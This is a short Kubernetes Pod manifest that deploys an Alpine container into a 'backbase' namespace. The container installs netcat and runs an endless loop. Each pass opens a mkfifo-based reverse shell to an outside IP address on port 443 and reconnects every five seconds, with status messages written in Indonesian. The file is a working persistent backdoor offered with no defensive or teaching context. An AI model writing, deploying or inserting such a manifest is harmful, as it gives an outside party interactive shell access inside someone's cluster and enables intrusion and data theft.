apiVersion: v1
kind: Pod
metadata:
  name: auto
  namespace: backbase
spec:
  containers:
  - name: alpine
    image: alpine:latest
    command: ["/bin/sh"]
    args:
    - -c
    - |
      apk add --update netcat-openbsd
      while true; do
        echo "=== Mencoba reverse shell ke 203.175.125.130:443 ==="
        rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 203.175.125.130 443 > /tmp/f
        echo "Koneksi putus, reconnect dalam 5 detik..."
        sleep 5
      done
  restartPolicy: Never
